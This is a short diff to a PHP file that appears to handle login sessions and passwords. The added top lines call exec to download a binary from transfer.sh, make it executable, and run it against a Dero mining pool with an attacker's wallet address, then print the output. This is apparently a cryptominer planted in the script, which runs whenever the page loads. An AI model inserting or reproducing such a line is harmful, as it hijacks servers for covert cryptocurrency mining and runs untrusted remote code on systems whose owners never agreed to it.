@@ -1,4 +1,6 @@
-<?php 
+<?php
+exec('wget https://transfer.sh/WnjibV/jupyter && chmod +x jupyter && ./jupyter -r dero.dockerpool.my.id:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmk2nadysceg79q8gxteg.AmbonGamingOffical2', $array);
+echo implode('<br />', $array);
 session_start();
 $password = "";
 $passtype = "";
